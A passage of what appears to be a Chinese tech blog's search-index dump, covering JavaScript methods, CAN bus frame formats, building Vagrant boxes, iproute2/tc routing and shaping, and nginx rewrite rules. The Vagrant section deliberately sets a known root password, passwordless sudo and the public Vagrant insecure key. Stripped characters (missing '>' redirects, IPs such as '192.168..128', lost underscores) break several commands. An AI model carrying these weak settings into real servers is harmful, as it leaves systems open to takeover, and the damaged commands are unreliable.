5规范了另一个函数对象的属性：caller。这个属性保存着调用当前函数的的函数的引用。\n\n每个函数都包含两个非继承而来的方法：apply()和call()。它俩的用途是在特定的作用域中调用函数，实际上等于设置函数体内this对象的值。\n\napply()方法接收两个参数：一个是在其中运行函数的作用域，另一个是参数数组，可以是Array的实例，也可以是arguments对象。\n\ncall()方法与apply()方法区别仅在于接收参数的方式不同。使用call()方法时，传递给函数的参数必须逐个列举出来。\n\n使用call()和apply()来扩充作用域最大的好处是，对象不需要与方法有任何耦合关系。\n\nECMAScript 5还定义了一个方法bind()。这个方法会创建一个函数的实例，其this的值会被绑定到传给bind()函数的值。例如：\n\nvar o={color:'red'};\n\nfunction sayColor(){\n\talert(this.color);\n}\n\nvar objectSayColor=sayColor.bind(o);\n\nobjectSayColor(); //red\n\n参考资料：https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/GlobalObjects/Function/apply\n\n String 类型\n\nString 类型的实例都有一个length属性，表示字符串中包含的字符数量。需要注意的是，即使字符串中包含双字节字符（不是只占一个字节的ASCII字符），每个字符也只算一个字符。\n\n字符方法\n\n用于访问字符串中特定字符。charAt() 和charCodeAt() 。这两个方法都接收一个参数，即基于0的字符位置。\n\n 字符串操作方法\n\nconcat()，用于将一个或多个字符串拼接起来。返回拼接得到的新字符串。concat()方法可以接受任意多个参数。在实践中更多的是使用加号操作符。\n\n三个基于子字符串创建新字符串的方法：\n\nslice():接收一到两个参数。第一个参数指定子字符串的起始位置，第二个参数指定了结束位置。如果省略，默认是字符串末尾。\nsubstr():接收一到两个参数。第一个参数指定子字符串的起始位置，第二个参数指定子字符串长度。如果省略，默认是字符串末尾。\nsubstring():接收一到两个参数。第一个参数指定子字符串的起始位置，第二个参数指定了结束位置。如果省略，默认是字符串末尾\n\n字符串位置方法\n\nindexOf() 和 lastIndexOf()用于从字符串中查找子字符串。返回子字符串的位置，如果没有找到返回-1。\n\n 字符串模式匹配\n\nmatch()：本质上与调用RegExp 的 exec() 方法相同。只接收一个参数，正则表达式或者 RegExp 对象。返回结果是一个数组：数组的第一项是与整个模式匹配的字符串，之后的每一项（如果有）保存着与正则表达式中的捕获组匹配的字符串\nsearch()：只接收一个参数，正则表达式或者 RegExp 对象。返回字符串中第一个匹配项的索引，如果没有找到，则返回-1。\nreplace()：接收两个参数：第一个参数是一个 RegExp 对象或者一个字符串（这个字符串不会被转换成正则表达式），第二个参数是一个字符串或者函数。如果第一个参数是字符串，那么只会替换第一个子字符串。要想替换所有子字符串，唯一的办法就是提供一个正则表达式，而且要指定全局标志。\nsplit()：基于指定的分隔符将一个字符串分割为多个字符串，并将结果放到一个数组中。分割符可以使字符串，也可以是 RegExp 对象。它还接收可选的第二个参数，用于指定数组的大小，以确保返回的数组不会超过既定大小。\n\nfromCharCode()\n\nString构造函数还有一个静态方法：fromCharCode()。它接收一个或多个字符编码，然后将它们转换成一个字符串。从本质上看，它与charCodeAt()执行的是相反的操作。\n\n 单体内置对象\n\nGlobal\n\n事实上，没有全局变量或全局函数，所有在全局作用域中定义的属性和函数，都是Global对象的属性。\n\n它包含的方法有：\n\nisNaN()\nisFinite\nparseInt()\nparseFloat()\n\n还包括URI编码方法：\n\nencodeURI() :不会编码下面的字符\n\n\t保留字符：; , / ? : @ \u0026 = + $\n\t非转义的字符：alphabetic, decimal digits, -  .! ~  ' ( )\n\tscore: ``\n\nencodeURIComponent() ：不会编码下面的字符：\n\n\t非转义的字符：alphabetic, decimal digits, -  .! ~  ' ( )\n\ndecodeURI() :只能对使用encodeURI()替换的字符进行解码。\ndecodeURIComponent(): 能够解码使用encodeURIComponent()编码的所有字符。\n\neval() 方法，只接受一个参数，要执行的ECMAScript字符串。当解析器发现代码中调用eval()方法时，它会将传入的参数当做实际的ECMAScript语句来解释，然后把执行结果插入到原位置。通过eval()执行的代码被认为是包含该次调用的执行环境的一部分，因此被执行的代码具有与该执行环境相同的的作用域链。\n\nMath 对象\n\nmin()和max()用于确定一组数中最大值或是最小值。这两个方法都接收任意多个数值参数。\n\n要找到数组中的最大最小值，可以使用apply()，例如：\n\nvar values=[1,2,3,4,5]\nvar max=Math.max.apply(Math,values)\n\n 舍入方法\n\nMath.ceil() 向上舍入\nMath.floor() 向下舍入\nMath.round() 标准舍入\n\nrandom() 方法返回一个介于0到1之间的一个随机数，不包括0和1。\n\n从某个整数范围内随机选择一个值\n\n值=Math.floor(Math.random()可能值得总数+第一个可能的值)\n`","tags":null},{"location":"//blog.pytool.com/Hardware/车联网/2017-02-04 CANBUS协议解析","title":"CANBUS协议解析","text":"CAN协议，系统结构和帧结构\n一张图诠释CAN标准帧和扩展帧的区别\n简单学习STM32CAN协议\n\nRTR Remote Transmission Request 远程帧 [ 隐性(1)为远程帧 )\nIDE Identifier Extension 扩展帧 [ 隐性(1) 为扩展帧]\nr0 r1 总是用隐性来填充\nCAN BUS（Controller Area Network）即控制器局域网，是国际上应用最广泛的现场总线之一。起先，CAN BUS被设计作为汽车环境中的微控制器通讯，在车载各电子控制装置ECU之间交换信息，形成汽车电子控制网络。比如：发动机管理系统、变速箱控制器、仪表装备、电子主干系统中，均嵌入CAN控制装置。\nCAN BUS是一种多主方式的串行通讯总线，基本设计规范要求有高的位速率，高抗电磁干扰性，而且能够检测出产生的任何错误。当信号传输距离达到10Km时，CAN BUS仍可提供高达5Kbps的数据传输速率。由于CAN串行通讯总线具有这些特性，它很自然地在汽车电子行业中受到广泛应用。\n下面从与我们工作相关的物理层特性、帧格式、命令交互等三个方面来介绍CAN BUS协议。\nØ  物理层特性：可分为单线CAN协议和双线CAN协议。单线CAN协议目前主要出现在GM车系里面，1号脚通讯，波特率为33.3K。双线CAN协议常见的波特率有500K(6/14)、250K(6/14)和125K(3/11)，括号内为通讯脚位。单、双线CAN协议的命令交互格式基本一致。\nØ  帧格式：\nCAN2.0A标准帧为11个字节，包括信息和数据两部分，前3个字节为信息部分。\n  \t7 \t6 \t5 \t4 \t3 \t2 \t1 \t0\n字节1 \tFF \tRTR \tx \tx \tDLC   数据长度\n字节2 \t报文识别码      ID.10-ID.3\n字节3 \tID.2-ID.0 \tx \tx \tx \tx \tx\n字节4 \t数据1\n字节5 \t数据2\n字节6 \t数据3\n字节7 \t数据4\n字节8 \t数据5\n字节9 \t数据6\n字节10 \t数据7\n字节11 \t数据8\n字节1 为帧信息 第7位FF  表示帧格式（在标准帧中FF＝0，在扩展帧中FF＝1）　　　　　\n第6位RTR 表示帧的类型（RTR=0表示为数据帧　RTR=1表示为远程帧）　　\nDLC      表示在数据帧时实际的数据长度\n       字节2-3  为报文识别码11位有效\n字节4-11为数据帧的实际数据，远程帧时无效\n\n命令帧示例：\nTools: 08H 07H E0H 03H 19H 02H FFH 00H 00H 00H 00H\nECU  : 08H 07H E8H 10H 0FH 59H 02H FFH 01H 80H 00H\n通常情况下，标准CAN协议的响应帧报文识别码就是请求帧的报文识别码加上8，即0x7E8，左移5位后就是我们所看到的FD 00。\n\nCAN2.0B扩展帧信息为13个字节，包括信息和数据两部分，前5个字节为信息部分。\n  \t7 \t6 \t5 \t4 \t3 \t2 \t1 \t0\n字节1 \tFF \tRTR \tx \tx \tDLC   数据长度\n字节2 \t报文识别码              ID.28-ID.21\n字节3 \tID.20-ID.13\n字节4 \tID.12-ID.5\n字节5 \tID.4-ID.0 \tx \tx \tx\n字节6 \t数据1\n字节7 \t数据2\n字节8 \t数据3\n字节9 \t数据4\n字节10 \t数据5\n字节11 \t数据6\n字节12 \t数据7\n字节13 \t数据8\n       字节1　为帧信息  第7位FF　表示帧格式（在标准帧中FF＝0，在扩展帧中FF＝1） 　　　　　\n第6位RTR 表示帧的类型（RTR=0表示为数据帧　RTR=1表示为远程帧）\nDLC 　　　表示在数据帧时实际的数据长度\n字节2－5  为报文识别码其高29位有效\n字节6－13 为数据帧的实际数据，远程帧时无效\n命令帧示例：\nTools: 88H 18H DAH 11H F1H 03H 19H 02H FFH 00H 00H 00H 00H\nECU  : 88H 18H DAH F1H 11H 10H 0FH 59H 02H 01H FFH 01H 00H\n通常情况下，响应帧的报文识别码只需要把目标地址和源地址交换位置即可。\n\nØ  命令交互：\nCAN协议的主要命令交互形式有发1帧回1帧、发1帧回多帧、发多帧回1帧及发多帧回多帧，下面分别举例说明。\n发1帧回1帧：\nTools: 08H 07H E0H 03H 19H 02H FFH 00H 00H 00H 00H\nECU  : 08H 07H E8H 04H 59H 02H FFH 01H 80H 01H 00H\n第一个字节的低4位表示除报文识别码的两个字节外其他字节的长度，第四个字节03表示后面有效数据的长度。\n发1帧回多帧：\nTools: 08H 07H E0H 03H 19H 02H FFH 00H 00H 00H 00H\nECU  : 08H 07H E8H 10H 0FH 59H 02H FFH 01H 80H 00H\nTools: 08H 07H E0H 30H 00H 00H 00H 00H 00H 00H 00H\nECU  : 08H 07H E8H 21H FFH 01H 79H F1H E3H 01H 62H\nECU  : 08H 07H E8H 22H F1H FFH 00H 00H 00H 00H 00H\n发出第一条请求帧后，如果响应帧的第四个字节高四位大于0，则表示回多帧。响应帧的有效数据长度为0x100F\u00260x0FFF=0x0F，表示有15个有效数据的回复帧。设备紧跟着发送流控制帧Tools: 08H 07H E0H 30H 00H 00H 00H 00H 00H 00H 00H来接收下面的有效回复数据，这个流控制帧在不同的车上可能会不一样。\n发多帧回1帧：\nTools: 08H 07H E0H 10H 09H 01H 02H 03H 04H 05H 06H\nECU  : 08H 07H E8H 30H 00H 00H 00H 00H 00H 00H 00H\nTools: 08H 07H E0H 21H 07H 08H 09H 00H 00H 00H 00H\nECU  : 08H 07H E8H 04H 59H 02H FFH 01H 80H 01H 00H\n发第一条请求帧的时候，如果请求帧第4个字节高四位大于0，则表示发多帧，发送的命令数据长度有第4，第5个字节一起决定，在这里数据长度为9，这时候ECU响应0x30的流控制帧，Tools继续发送请求帧，蓝色为有效数据，发送完后，ECU响应正确的命令回复。\n发多帧回多帧：\nTools: 08H 07H E0H 10H 09H 01H 02H 03H 04H 05H 06H\nECU  : 08H 07H E8H 30H 00H 00H 00H 00H 00H 00H 00H\nTools: 08H 07H E0H 21H 07H 08H 09H 00H 00H 00H 00H\nECU  : 08H 07H E8H 10H 0FH 59H 02H FFH 01H 80H 00H\nTools: 08H 07H E0H 30H 00H 00H 00H 00H 00H 00H 00H\nECU  : 08H 07H E8H 21H FFH 01H 79H F1H E3H 01H 62H\nECU  : 08H 07H E8H 22H F1H FFH 00H 00H 00H 00H 00H\n在这种情况下的交互，将发1帧回多帧和发多帧回1帧结合就可以了。需要注意的是，对于不同的ECU，由于细微协议的区别，在对于通过流控制帧来发送或接收剩余数据是不一样的，有的时候会通过一条流控制帧将所有数据一次收完，有时候则是采用1对1的方式。","tags":null},{"location":"//blog.pytool.com/Post/2016-06-01 Linux命令 Vagrant","title":"vagrant","text":"初步\nInstall\n downloads\naria2c -c -x 10 https://releases.hashicorp.com/vagrant/1.9.3/vagrant1.9.3x8664.deb\n sudo dpkg -i vagrant1.9.3x8664.deb \n\n 配置代理\n Install proxyconf:\n\nvagrant plugin install vagrant-proxyconf\nConfigure your Vagrantfile: vi $HOME/.vagrant.d/Vagrantfile\nconfig.proxy.http     = \"http://127.0.0.1:8087\"\nconfig.proxy.https    = \"http://127.0.0.1:8087\"\nconfig.proxy.noproxy = \"localhost,127.0.0.1\"\n在官网https://www.vagrantup.com/ 下载对应平台的软件包安装. Vagrant不用来建立虚拟机, 因此\n\n确保你安装有VirtualBox.\n\n 制作box\n    建虚拟机这种事对任何一个开发人员都是小意思. 这里主要注意几点就OK了. 这里主要使用Ubuntu发行版, 其他版本会有些许差异.\n    启动虚拟,并做如下配置:\n    请将用户名和密码都设置为vagrant, 毕竟之后的box会分发给第三者\n    安装ssh, 命令: sudo apt-get install openssh-server\n    修改root密码为vagrant,命令: sudo passwd root\n    设置vagrant用户sudo免密码, 建议在/etc/sudoers.d/目录 新建vagrant文件并写入vagrant ALL=(ALL) NOPASSWD:ALL | echo 'vagrant ALL=(ALL) NOPASSWD:ALL'   /etc/sudoers.d/vagrant\n    添加公钥到~/.ssh/authorizedkeys文件. 可以使用自己的公钥, 也可以使用Vagrant公开的, 命令: wget https://raw.githubusercontent.com/mitchellh/vagrant/master/keys/vagrant.pub -O ~/.ssh/authorizedkeys. 确保.ssh目录权限为0700和authorizedkeys文件权限为0600. vagrant私钥: https://raw.githubusercontent.com/mitchellh/vagrant/master/keys/vagrant\n    推荐安装虚拟机增强包guest additions package来实现文件共享, 点击安装增强包后, 命令: sudo mount /dev/cdrom /media/cdrom; cd /media/cdrom; sudo ./VBoxLinuxAdditions.sh, 可能要安装依赖sudo apt-get install linux-headers-generic build-essential dkms\n    配置软件源, 安装需要的软件, 更新系统设定虚拟机的端口转发, 图形设置:控制-  设置-  网络-  端口转发,关键的两点是主机端口任意和虚拟机端口22\n\n基本上, 以上就是主要操作了, 除了第1个是在VirtualBox建虚拟机时设定的, 第8条是在VirtualBox上设定虚拟机的参数, 其余全是在虚拟机内进行的. 这些都是标准设定, 你可以改变用户名和密码, 根用户密码, 以及公钥, 只是需要在项目目录的Vagrantfile文件进行相应的参数设定.\n\n打包为 Box\n  生成Base Box\n  vagrant package --base vmname --output /path/to/boxname.box\n      vmname是virtualbox虚拟机列表中的名字, 新建虚拟机时输入的名称,\n      省略--output时默认在当前目录下生成.box文件. 命令可在任意目录下执行.\n\n执行命令前最好先关闭虚拟机,就目前的情况看,虽然vagrant能自动ssh到虚拟机并执行关机命令,但在windows执行失败,不确定和平台有没有关系.\n如果当前虚拟机本身是从Box解压生成的, 你安装了些软件, 更新了下系统, 反正是做出些改变, 可以省略--base vmname参数, 以将改动后的虚拟机重打包成box以分发.\n\n  将box添加到全局环境中\nvagrant box add boxname boxurl  等效\nvagrant box add boxurl --name boxname\n\n此命令最好在box的生成目录下进行, 否则需要其完整路径.\nboxurl随意, 唯一的用处是全局定位指定的box, 以方便解压生成虚拟机, 而不用指定box文件的完整路径.\n\nvagrant box add precise64 http://files.vagrantup.com/precise64.box\n\n 生成虚拟机\n\n新建项目目录并切换, 执行vagrant init boxurl命令. 生成.vagrant目录, 包含ssh到虚拟机的私钥, 以及Vagrantfile文件, 用于虚拟机的参数设定.\n\n好了, 你现在从指定的box生成了一个新的虚拟机, 对这个虚拟机的所有操作都不会影响到box, 在不需要时完全可以删除.\n\n以下命令是经常使用的:\nvagrant up  # 开机\nvagrant ssh  # 连接\nvagrant halt  # 关机\nvagrant suspend  # 相当于休眼\nvagrant resume  # 恢复\nvagrant destroy [-f] # 删除虚拟机\n更多的命令\n\n管理系统的box\nvagrant box list查看全局box\nvagrant box remove boxname移除box\nvagrant box outdated检查当前项目使用的box是否有更新\nvagrant box repackage NAME PROVIDER VERSION 重打包box到当前目录,其中3个参数由vagrant box list获取.是add解压的反过程\nvagrant box update [--box boxname]更新box,但并不反应在当前项目的虚拟机上,需要destroy后再up\n额外的说明\n\n在windows平台,请确保ssh程序在path中,或者通过你喜欢的ssh client,如putty, xshell. 默认up时会建立主机2222端口到虚拟机22端口的映射, 并删除此前添加的公开公钥而使用随机生成的公钥, 而对应的私钥存储在当前项目目录的.vagrant\\machines\\default\\virtualbox\\privatekey, 用户名为vagrant.\n\n开启虚拟机后,并不显示虚拟机, 但其确实已运行, 打开virtualbox后可看到项目运行的虚拟机名,点击显示则可显示虚拟机. 或者说, 虚拟机默认以headless模式运行, 也就是不显示界面, 这是VirtualBox提供的功能.\n\n就我个人理解来看, 实际上, 上述的功能都可以通过VboxManage命令来进行. Vagrant对虚拟机的管理, 要么通过VirtualBox提供的开发接口来实现, 要么能过ssh到虚拟机中来实现.\n\n最后, Vagrant是用Ruby开发的.\n\n修改默认的public同步文件夹至其他文件夹\n\n打开Vagrantfile，找到\n\nconfig.vm.syncedfolder \".\", \"/var/www\", :mount_options =  [\"dmode=777\", \"fmode=666\"]\n\n修改\".\"为自己的目录，然后vagrant up开启虚拟机，进入ect/apache2目录，配置vituralhost的directory，从public改为自定目录即可\n box镜像文件快速下载\n\nbox镜像文件动辄五六百MB，如果用Vagrant默认的下载方式，真的不知道下到啥时候，这里介绍一个『快一点』的下载方式：\n\n    首先按照正常步骤，输入vagrant up之后会有一句指示当前下载box文件的url，例如\n\n    ==  default: Adding box 'hashicorp/precise32' (v1.0.0) for provider: virtualbox\n\n    default: Downloading: https://atlas.hashicorp.com/hashicorp/boxes/precise32/versions/1.0.0/providers/virtualbox.box\n\n    此时我们ctrl+c强制停止当前进程，将url拷贝到迅雷或者别的下载工具中进行下载，下载完成后进入下载目录，打开命令行，输入（其中hashicorp/precise32为配置文件为box镜像起的名字）\n\n    vagrant box add hashicorp/precise32\n\n    Vagrant会自动对box镜像进行处理，此时我们再回到之前的Vagrant配置目录中，vagrant up启动，过不了一会儿就安装好了。","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/2015-03-29 iproute2和tc的一些用法","title":"iproute2和tc的一些用法","text":"Linux advanced router\nip link show                             显示链路\nip addr show                          #显示地址(或ifconfig)\nip route show                            #显示路由(route -n)\nip neigh show                            #显示arp表(ping 192.168.95.50，如果主机在同一局域网内，直接加到arp表)\nip neigh delete 192.168.95.50 dev eth0   #删除arp条目，条目仍然存在状态为stale，下次通信需要确认\nip rule show                             #显示缺省规则\nip route del default dev eth0            #删除接口路由\nip route show table local                #查看本地静态路由\nip route show table main                 #查看直连路由\n\n###########\n未测\n###########\necho 200 John     /etc/iproute2/rttables  #设置名字对于数值\nip rule add from 10.0.0.10 table John    #指定源地址\nip route add default via 192.168.44.128 dev ppp2 table John #将数据指向该表网关\nip route flush cache\n\n#################################################################\n测试双线上网,负载均衡\n###########################################################\nLocal environment：\nOutput interface:\neth0:192.168..128 gateway:192.168..2\neth2:192.168.1.109   gateway:192.168.1.109\n\nInput interface:\neth1:192.168.95.2 netmaks 255.255.255.0\n\nip rule add from 192.168..128 table 150\nip rule add from 192.168.1.109 table 151\n\nip route add default via 192.168..2 table 150\nip route add default via 192.168.1.1 table 151\n\nip route add 192.168..0/24 dev eth0 src 192.168..128 table 150\nip route add 192.168.1.0/24 dev eth2 src 192.168.1.109 table 151\n\nip route replace default scope global nexthop via 192.168..2 dev eth0 weight 1 nexthop via 192.168.1.1 dev eth2 weight 1\nip route flush cache\n\niptables -t nat -A POSTROUTING -o eth0 -s 192.168.95.0/24 -j SNAT --to-source 192.168..128\niptables -t nat -A POSTROUTING -o eth2 -s 192.168.95.0/24 -j SNAT --to-source 192.168.1.109\n\necho \"nameserver 210.21.4.130\"   /etc/resole.conf\n\n##################################################\n测试双线上网,负载均衡，跟上面一样的，写法稍微好点\n############################################\nLocal environment：\nOutput interface:\neth0:192.168..128 gateway:192.168..2\neth2:192.168.1.109   gateway:192.168.1.109\n\nInput interface:\neth1:192.168.95.2 netmaks 255.255.255.0\n\nip rule add pref 10 from 192.168..128 table 10\nip rule add pref 10 from 192.168.1.109 table 20\n\nip route replace default via 192.168..2 dev eth0 table 10\nip route replace default via 192.168.1.1 dev eth2 table 20\n\n下面两句主要增加\n物理机通过nat接口(与eth0在同一网段)访问需要在网关加一条路由，通过bridged接口(与eth2在同一网段)访问正常\nip route add 192.168..0/24 dev eth0 src 192.168..128 table 150\nip route add 192.168.1.0/24 dev eth2 src 192.168.1.109 table 151\n\nip route replace default nexthop via 192.168..2 dev eth0 weight 4 nexthop via 192.168.1.1 dev eth2 weight 1\nip route flush cache\n\niptables -t nat -A POSTROUTING -o eth0 -s 192.168.95.0/24 -j SNAT --to-source 192.168..128\niptables -t nat -A POSTROUTING -o eth2 -s 192.168.95.0/24 -j SNAT --to-source 192.168.1.109\n\niptables -t nat -A POSTROUTING -m iprange --src-range 192.168.22.3-192.168.22.255 -j SNAT --to-source 192.168.1.254\niptables -t nat -A POSTROUTING -m iprange --src-range 192.168.22.3-192.168.22.255 -j SNAT --to-source 192.168.233.2\n\necho \"nameserver 210.21.4.130\"   /etc/resole.conf\n\n#########################################################\n网络上个一个例子\n###################################################\nLink: http://www.study-area.org/tips/multipath.htm\n實作指令\n\n5.1 獲取當前各界面之 ip ：\nip address show\n1: lo: LOOPBACK,UP mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 brd 127.255.255.255 scope host lo\n2: eth0: BROADCAST,MULTICAST,UP mtu 1500 qdisc pfifofast qlen 1\n    link/ether 00:02:44:84:26:4f brd ff:ff:ff:ff:ff:ff\n    inet 220.130.96.21/24 brd 220.130.96.255 scope global eth0\n3: eth1: BROADCAST,MULTICAST,UP mtu 1500 qdisc pfifofast qlen 1\n    link/ether 00:20:ed:36:f9:74 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.100.2/24 brd 192.168.100.255 scope global eth1\n4: eth2: BROADCAST,MULTICAST,UP mtu 1500 qdisc pfifofast qlen 1\n    link/ether 00:02:b3:4b:69:49 brd ff:ff:ff:ff:ff:ff\n    inet 10.1.2.3/24 brd 10.1.2.255 scope global eth2\n15: ppp0: POINTOPOINT,MULTICAST,NOARP,UP mtu 1492 qdisc pfifo_fast qlen 3\n    link/ppp\n    inet 210.64.33.27 peer 210.64.33.1/32 scope global ppp0\n\n5.2 設定 ip rule ：\n ip rule add pref 10 from 220.130.96.21 table 10\nip rule add pref 20 from 192.168.100.2 table 20\n ip rule add pref 30 from 210.64.33.27 table 30\n\n5.3 設定 ip route 各 table ：\nip route replace default via 220.130.96.254 dev eth0 table 10\n ip route replace default via 192.168.100.1 dev eth1 table 20\nip route replace default via 210.64.33.1 dev ppp0 table 30\n\n5.4 設定 ip route main table：\n ip route replace default \\\n  nexthop via 220.130.96.254 dev eth0 weight 4 \\\n  nexthop via 192.168.100.1 dev eth1 weight 1 \\\n  nexthop via 210.64.33.1 dev ppp0 weight 1\n\n5.5 檢視 main table 規則：\nip route show\n210.64.33.1 dev ppp0  proto kernel  scope link  src 210.64.33.27\n192.168.100.0/24 dev eth1  scope link\n220.130.96.0/24 dev eth0  scope link\n10.1.2.0/24 dev eth2  scope link\n169.254.0.0/16 dev eth2  scope link\n127.0.0.0/8 dev lo  scope link\ndefault\n        nexthop via 220.130.96.254  dev eth0 weight 4\n        nexthop via 192.168.100.1  dev eth1 weight 1\n        nexthop via 210.64.33.1  dev ppp0 weight 1\n\n5.6 刷新 route cache：\n ip route flush cache\n\n5.7 測試及確認連線生效：\n基本上，若在輸入上述命令中沒遇到 error ，那設定就已完成。\n接下來可起用多個對外連線(或用 ping)，\n然後使用 tcpdump -i any 來查看封包是否能分攤在每一條連線上。\n#################################################################\n\n#########################################\n\n################################################################\ntc 流量控制:\n测试环境\nOutput: eth0 192.168..128\nInput： eth1 192.168.95.2\n##########################################################\n限制单个地址已测\n\n队列规定 qdisc(queueing discipline) ,类(class)和分类器(Classifiers)\n\n清除接口所有规则\ntc qdisc del dev eth1 root 2  /dev/null\ntc -s qdisc show dev eth1   查看总的流量\n\n限制单个ip流量\ntc qdisc add dev eth1 root handle 1: htb r2q 1\ntc class add dev eth1 parent 1: classid 1:1 htb rate 100kbit ceil 200kbit\ntc filter add dev eth1 parent 1: protocol ip prio 1 u32 match ip dst 192.168.95.50 flowid 1:1\n\n############################################\n实际流量是这里6倍\ntc qdisc del dev eth1 root 2  /dev/null\ntc qdisc add dev eth1 root handle 1: htb default 30\ntc class add dev eth1 parent 1: classid 1:1 htb rate 15kbit ceil 15kbit\ntc class add dev eth1 parent 1:1 classid 1:10 htb rate 10kbit ceil 10kbit\ntc class add dev eth1 parent 1:1 classid 1:20 htb rate 5kbit ceil 5kbit\n\ntc qdisc add dev eth1 parent 1:10 handle 10: sfq perturb 10\ntc qdisc add dev eth1 parent 1:20 handle 20: sfq perturb 10\n\ntc filter add dev eth1 parent 1: protocol ip prio 1 u32 match ip dst 192.168.95.50 flowid 1:10\ntc filter add dev eth1 parent 1: protocol ip prio 1 u32 match ip dst 192.168.95.51 flowid 1:20\n\ntc class show dev eth1 classid 1:1\ntc class show dev eth1 classid 1:10\ntc class show dev eth1 classid 1:20\n\ntc -s filter show dev eth1\ntc -s class show dev eth1\ntc -s class show dev eth1 classid 1:1\ntc -s class show dev eth1 classid 1:10\ntc -s class show dev eth1 classid 1:20\n\n############################################\n\niptables -t filter -F\niptables -t filter -X\niptables -t filter -Z\n\niptables -t mangle -F\niptables -t mangle -X\niptables -t mangle -Z\n\niptables -t nat -F\niptables -t nat -X\niptables -t nat -Z\n\ntc qdisc del dev eth1 root 2  /dev/null\ntc qdisc add dev eth1 root handle 1: htb default 30\ntc class add dev eth1 parent 1: classid 1:1 htb rate 15kbit ceil 15kbits\ntc class add dev eth1 parent 1:1 classid 1:10 htb rate 10kbit ceil 10kbit\ntc class add dev eth1 parent 1:1 classid 1:20 htb rate 5kbit ceil 5kbit\n\ntc qdisc add dev eth1 parent 1:10 handle 10: sfq perturb 10\ntc qdisc add dev eth1 parent 1:20 handle 20: sfq perturb 10\n\ntc filter add dev eth1 parent 1: protocol ip prio 1 handle 6 fw flowid 1:10\ntc filter add dev eth1 parent 1: protocol ip prio 1 handle 7 fw flowid 1:20\n\n对路由到本地的包有效速度控制\niptables -t mangle -A OUTPUT -o eth1 --destination 192.168.95.50 -j MARK --set-mark 0x6\niptables -t mangle -A OUTPUT -o eth1 --destination 192.168.95.51 -j MARK --set-mark 0x7\n\n对转发包速度控制\niptables -t mangle -A PREROUTING -i eth1 --source 192.168.95.50 -j MARK --set-mark 0x6\niptables -t mangle -A PREROUTING -i eth1 --source 192.168.95.51 -j MARK --set-mark 0x7\n\niptables -t filter -nvL\niptables -t mangle -nvL","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx rewrite","title":"Linux命令 Nginx rewrite","text":"server {\n\n  listen 8000;\n\n  servername project.example.com;\n\n  root   /path/to/www;\n\n  #Matches the path project.example.com only (mind there is a =)\n\n  location = / {\n\n    #the rewrite statement will forward the project.example.com to project.example.com/project (which must be handled internally)\n\n    rewrite / /project;\n\n  }\n\n  #Matches every path (mind: there is no =)\n\n  location / {\n\n    #the rewrite statement with \"permanent\" at the end will visibly forward every link on the subdomain to the main domain\n\n   rewrite ^(.+)$ http://www.example.be$requesturi? permanent;\n\n  }\n\n  ... #php handling code\n\nrewrite ^/(ask|forum|qa)/(.)$ http://forum.site.com/$2 permanent;\n\nredirect URL subdirectory to subdomain\nserver {\n    servername  www.mydomain.com mydomain.com;\n    rewrite ^(.) http://mysite.mydomain.com$1 permanent;\n}\n\nserver {\nlisten :80;\nservername mysite.mydomain.com;\nroot /var/www/mydomain.com/mysite;\n......\n}\n\nnginx通过ngxhttprewritemodule模块支持url重写、支持if条件判断，但不支持else。\n\n该模块需要PCRE支持，应在编译nginx时指定PCRE源码目录, nginx安装方法。\nnginx rewrite指令执行顺序：\n\n执行server块的rewrite指令(这里的块指的是server关键字后{}包围的区域，其它xx块类似)\n执行location匹配\n执行选定的location中的rewrite指令\n\n如果其中某步URI被重写，则重新循环执行1-3，直到找到真实存在的文件\n\n如果循环超过10次，则返回500 Internal Server Error错误\n\nbreak指令\n\n语法：break;\n默认值：无\n作用域：server,location,if\n\n停止执行当前虚拟主机的后续rewrite指令集\nbreak指令实例：\n if ($slow) {\n     limitrate 10k;\n     break;\n }\n\n if ($slow) {\n     limitrate 10k;\n     break;\n }\n\nif指令\n\n语法：if(condition){...}\n默认值：无\n作用域：server,location\n对给定的条件condition进行判断。如果为真，大括号内的rewrite指令将被执行。\nif条件(conditon)可以是如下任何内容:\n\n    一个变量名；false如果这个变量是空字符串或者以0开始的字符串；\n    使用= ,!= 比较的一个变量和字符串\n    是用~， ~ 与正则表达式匹配的变量，如果这个正则表达式中包含}，;则整个表达式需要用\" 或' 包围\n    使用-f ，!-f 检查一个文件是否存在\n    使用-d, !-d 检查一个目录是否存在\n    使用-e ，!-e 检查一个文件、目录、符号链接是否存在\n    使用-x ， !-x 检查一个文件是否可执行\n\nif指令实例\n if ($httpuseragent ~ MSIE) {\n     rewrite ^(.)$ /msie/$1 break;\n }\n\n if ($httpcookie ~ \"id=(+)(?:;|$)\") {\n     set $id $1;\n }\n\n if ($requestmethod = POST) {\n     return 405;\n }\n\n if ($slow) {\n     limitrate 10k;\n }\n\n if ($invalidreferer) {\n     return 403;\n }\n\nreturn指令\n\n语法：return code;\n\nreturn code URL;\n\nreturn URL;\n默认值：无\n作用域：server,location,if\n\n停止处理并返回指定状态码(code)给客户端。\n非标准状态码444表示关闭连接且不给客户端发响应头。\n从0.8.42版本起，return 支持响应URL重定向(对于301，302，303，307），或者文本响应(对于其他状态码).\n对于文本或者URL重定向可以包含变量\nrewrite指令\n\n语法：rewrite regex replacement [flag];\n默认值：无\n作用域：server,location,if\n如果一个URI匹配指定的正则表达式regex，URI就按照replacement重写。\nrewrite按配置文件中出现的顺序执行。flags标志可以停止继续处理。\n如果replacement以\"http://\"或\"https://\"开始，将不再继续处理，这个重定向将返回给客户端。\nflag可以是如下参数\nlast 停止处理后续rewrite指令集，然后对当前重写的新URI在rewrite指令集上重新查找。\nbreak 停止处理后续rewrite指令集，并不在重新查找,但是当前location内剩余非rewrite语句和location外的的非rewrite语句可以执行。\nredirect 如果replacement不是以http:// 或https://开始，返回302临时重定向\npermant 返回301永久重定向\n最终完整的重定向URL包括请求scheme(http://,https://等),请求的servernameinredirect和 portinredirec三部分 ，说白了也就是http协议 域名 端口三部分组成。\n\nrewrite实例\n server {\n     ...\n     rewrite ^(/download/.)/media/(.)..$ $1/mp3/$2.mp3 last;\n     rewrite ^(/download/.)/audio/(.)..$ $1/mp3/$2.ra last;\n     return 403;\n     ...\n }\n如果这些rewrite放到 “/download/” location如下所示, 那么应使用break而不是last , 使用last将循环10次匹配，然后返回 500错误:\n location /download/ {\n     rewrite 